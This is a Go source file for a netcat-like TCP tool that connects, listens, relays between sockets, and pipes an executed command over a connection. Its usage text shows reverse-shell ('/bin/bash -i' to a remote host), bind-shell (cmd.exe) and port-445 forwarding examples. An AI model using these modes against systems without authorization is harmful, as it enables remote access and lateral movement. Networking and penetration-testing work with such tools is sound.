package main

import(
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"flag"
	"os"
	"errors"
	"strings"
	"path/filepath"
)

// Type to handle multiple instances of connection/listen flags
type connList []string

func (i *connList) String() string {
	return "A Required String Representation for connect option."
}

func (i *connList) Set(value string) error {
	    *i = append(*i, value)
	        return nil
	}

// Command line arguments & flags 
var connections connList	// Assigned at start of main - custom type
var listeners connList		// As above
var command = flag.String("e", "", "Execute a command (quote) : -e '/bin/bash -i'")
var verboseFlag = flag.Bool("v", false, "Display detailed progress messages.")
var helpFlag = flag.Bool("h", false, "Print detailed usage.")

// Slightly messy function to format usage strings with program name
func prg(s string) string{
	return fmt.Sprintf(s, filepath.Base(os.Args[0]))
}

// Print detailed examples then usage
func detailedUsage() {
	flag.Usage()
	// Build up usage message
	var usg []string
	usg = append(usg, "\nSYNOPSIS:")
	usg = append(usg, prg("  %s connects two 'things' together. This could be your"))
	usg = append(usg, "  console (Stdin/Stdout), TCP Connections or TCP listeners")
	usg = append(usg, "\nEXAMPLES:")
	usg = append(usg, "  Connect your console to a remote port:")
	usg = append(usg, prg("    %s -c remote_host:port"))
	usg = append(usg, "  Start a listening socket connected to your console:")
	usg = append(usg, prg("    %s -l 1234"))
	usg = append(usg, "  Execute a command and connect the process to a remote listener:")
	usg = append(usg, prg("    %s -c remote_host:port -e '/bin/bash -i'"))
	longmsg := "  Execute a command and serve the process (multiple connections allowed):"
	usg = append(usg, longmsg)
	usg = append(usg, prg("    %s -l 1234 -e 'cmd.exe'"))
	usg = append(usg, "  Connect back to a remote_host and forward traffic to local port:")
	usg = append(usg, prg("    %s -c remote_host:1234 -c 127.0.0.1:445"))
	usg = append(usg, "  Forward connections via bind listener to localhost port 445:")
	usg = append(usg, prg("    %s -l 1234 -c 127.0.0.1:445"))
	usg = append(usg, "  Catch a connection and serve on your local host:")
	usg = append(usg, prg("    %s -l 3333 -l 1234\n"))
	usg = append(usg, prg("NOTE : Relay modes initialise one-way. Calling %s -l 40 -l 41 "))
	usg = append(usg, "         needs a connection on port 40, before port 41 opens. ")

	// Call standard usage
	for _, ln := range usg {
		fmt.Println(ln)
	}
}

// Print verbose debug messages
func verbose(format string, v ...interface{}) {
	n := len(format)
	if n > 0 && format[n-1] != '\n' {
		format += "\n"
	}
	if *verboseFlag {
		fmt.Fprintf(os.Stderr, format, v...)
	}
}
// Print error and exit
func die(format string, v ...interface{}) {
	s := fmt.Sprintf(format, v...)
	n := len(s)
	if n > 0 && s[n-1] != '\n' {
		s += "\n"
	}
	os.Stderr.WriteString(s)
	os.Exit(1)
}

// Parse the command line configs and determine the mode to operate in
func getMode(connections, listeners connList, command *string, helpFlag bool) (string, error) {
	// First things first, helpFlag overrides all behaviour
	if helpFlag {
		return "help", nil
	}
	// In verbose mode, print out parsed flags to the user
	for i, a := range connections {
		verbose("Connection (%d) specified: %s\n" ,i +1 , a)
	}
	for i, a := range listeners {
		verbose("Listen port (%d) specified: %s\n" ,i + 1 , a)
	}
	// Now we are only ever going to connect up to two things together
	// So let's count everything up!
	nConns := len(connections)
	nList := len(listeners)
	var nCmd int
	if len(*command) >= 1 {
		nCmd = 1
		// Now we've parsed the command, print in verbose mode
		verbose("Command specified: %s\n", *command)
	} else {
		nCmd = 0
	}

	// Get our working mode
	if len(os.Args) == 1{
		return "none", nil
	} else if nConns == 2 {
		return "conn2conn", nil
	} else if nList ==2{
		return "list2list", nil
	} else if nList == 1 && nConns == 1 {
		return "list2conn", nil
	} else if nCmd == 1 && nConns == 1 && nList == 0 {
		return "ex2conn", nil
	} else if nCmd == 1 && nList ==1 && nConns == 0 {
		return "ex2list", nil
	} else if nCmd == 0 && nList == 1 && nConns == 0{
		return "listen", nil
	} else if nCmd == 0 && nList == 0 && nConns == 1{
		return "connect", nil
	} else {
		template := "Too many opts. %d conns, %d listeners & %d commands."
		err := errors.New(fmt.Sprintf(template, nConns, nList, nCmd))
		return "invalid mode", err
	}
}

// Helper function used in the odd something toConnect function
func toConnect(src net.Conn, dstHost string){
	dst, err := net.Dial("tcp", dstHost)
	if err != nil {
		// Don't die because there may be multiple bind handlers
		log.Fatalln(fmt.Sprintf("%s unreachable", dstHost))
	}
	verbose("Connection to %s established", dstHost)
	defer dst.Close()
	// Using routines to prevent Copy() calls from blocking
	go func() {
		// Copy course to dest
		if _, err := io.Copy(dst, src); err != nil {
			log.Fatalln(err)
		}
	}()
	// Now copy dest to src
	if _, err := io.Copy(src, dst); err != nil {
		log.Fatalln(err)
	}
}

// Connection to connection relay mode - TODO add wait group in go call?
func connToConn(outerHost, innerHost string) {
	conn, err := net.Dial("tcp", outerHost)
	if err != nil {
		log.Fatalln(fmt.Sprintf("%s unreachable", outerHost))
	}
	verbose("Connection to %s established.", outerHost)
	defer conn.Close()
	toConnect(conn, innerHost)
}

// Single connection mode - classic Netcat style
func connect(host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		log.Fatalln(fmt.Sprintf("%s unreachable", host))
	} 
	defer conn.Close()
	verbose("Connection to %s made. Piping data...\n", host)
	go io.Copy(os.Stdout, conn)
	_, err = io.Copy(conn, os.Stdin)
}

// Listener to connection relay mode
func listToConn(host, portOuter, connectHost string) {
	bindHost := fmt.Sprintf(host, portOuter)
	listener, err := net.Listen("tcp", bindHost)
	if err != nil{
		log.Fatalln("Unable to bind on", bindHost)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Failed to accept connection")
		}
		toConnect(conn, connectHost)
	}
}

// Listener to listener relay mode
func listToList(host, portOuter, portInner string) {
	bindHostOuter := fmt.Sprintf(host, portOuter)
	listener, err := net.Listen("tcp", bindHostOuter) 
	if err != nil{
		log.Fatalln("Unable to bind on", bindHostOuter)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Failed to accept connection")
		}
		verbose("Connection to %s from %s", bindHostOuter, conn.RemoteAddr())
		go toListen(conn, fmt.Sprintf(host, portInner))
	}
}

// Helper function to aid readability of listener to listener function
func toListen(src net.Conn, bindHost string){
	listener, err := net.Listen("tcp", bindHost)
	verbose("Listening on %s\n", bindHost)
	defer listener.Close()
	if err != nil{
		die("Unable to bind on", bindHost)
	}
	for {
		dst, err := listener.Accept()
		defer dst.Close()
		verbose("Connection to %s from %s", bindHost, src.RemoteAddr())
		if err != nil {
			// No die because mabe we'll do multiple connections
			log.Fatalln("Failed to accept connection")
		}
		// Using routines to prevent Copy() calls from blocking
		go func() {
			// Copy source to dest
			if _, err := io.Copy(dst, src); err != nil {
				log.Fatalln(err)
			}
		}()
		// Now copy dest to src
		if _, err := io.Copy(src, dst); err != nil {
			log.Fatalln(err)
		}
	}
}

// Execute command over connect mode
func execToConn(command, connHost string) {
	cmd, args := splitCommand(command)
	conn, err := net.Dial("tcp", connHost)
	if err != nil {
		log.Fatalln(fmt.Sprintf("%s unreachable", connHost))
	} 
	defer conn.Close()
	verbose("Piping %s %s to %s", cmd, args, connHost)
	cmdln := exec.Command(cmd, args)
	// Set Stdin to an IO pipe
	rp, wp := io.Pipe()
	cmdln.Stdin = conn
	cmdln.Stdout = wp
	go io.Copy(conn, rp)
	cmdln.Run()
}

// Execute command over listener mode
func execToListener(command, host string){
	cmd, args := splitCommand(command)
	listener, err := net.Listen("tcp", host)
	if err != nil{
		log.Fatalln("Unable to bind on", host)
	} 
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Failed to accept connection")
		}
		defer conn.Close()
		verbose("Serving to connection from %s\n", conn.RemoteAddr())
		//go handleExec(conn, cmd, args)
		cmdln := exec.Command(cmd, args)
		// set stdin to an io pipe
		rp, wp := io.Pipe()
		cmdln.Stdin = conn
		cmdln.Stdout = wp
		go io.Copy(conn, rp)
		cmdln.Run()
	}
}

func handleExec(conn net.Conn, command string, args string) {
	// cmd object passed arguments from main
	cmd := exec.Command(command, args)
	// set stdin to an io pipe
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

// Listen mode - classic Netcat vibes
func listen(host string) {
	listener, err := net.Listen("tcp", host)
	if err != nil{
		log.Fatalln("Unable to bind on", host)
	} 
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Failed to accept connection")
		}
		verbose("Connection to %s from %s", host, conn.RemoteAddr())
		go func(c net.Conn) {
			io.Copy(os.Stdout, c)
			verbose("Connection closing : %s", conn.RemoteAddr())
			defer c.Close()
		}(conn)
		if _, err := io.Copy(conn, os.Stdin); err != nil {
			log.Fatalln(err)
			verbose("Failed to copy from Stdin to connection.")
		}
	}
}

// Split command line string passed for execute modes into command  and arguments
func splitCommand(command string) (string, string){
	commandArr := strings.Fields(command)
	cmd := commandArr[0]
	args := ""
	if len(commandArr) > 1 {
		for i, arg := range commandArr[1:]{
			if i == 0 {
				args += arg
			} else {
				args += ( " " + arg) // We stripped whitespace earlier
			}
		}
	}
	return cmd, args
}

func main () {
	
	// Assign multiple-call flag assignments
	flag.Var(&connections, "c", "Make a TCP Connection : -c 127.0.0.1:8080")
	flag.Var(&listeners, "l", "Listen on a port : -l 4444")
	flag.Parse()

	// Check our arguments and get the mode  we'll operate in
	mode, err := getMode(connections, listeners, command, *helpFlag)
	if err != nil {
		flag.Usage()
		die("Supplied flag configuration not supported.")
	}

	// Now do the thing in the right mode!
	if mode != "help" {
		verbose("Operating mode: %s\n", mode)
	}
	
	switch (mode) {
	case "help":
		detailedUsage()
	case "none":
		flag.Usage()
	case "conn2conn" :
		// Connect to connect
		connToConn(connections[0], connections[1])
	case "list2list":
		// Listener to listener
		listToList("0.0.0.0:%s", listeners[0], listeners[1]) 
	case "list2conn":
		// Listener to connect relay
		listToConn("0.0.0.0:%s", listeners[0], connections[0])
	case "ex2conn":
		// Command to connection
		execToConn(*command, connections[0])
	case "ex2list":
		// Exec command with Listener
		execToListener(*command, fmt.Sprintf("0.0.0.0:%s", listeners[0]))
	case "listen":
		// Listen to stdin/stdout
		listen(fmt.Sprintf("0.0.0.0:%s", listeners[0]))
	case "connect":
		// Connect to stding/sdout
		connect(connections[0])
	default:
		flag.Usage()
		die("Error - Invalid mode (somehow!).")
	}
}
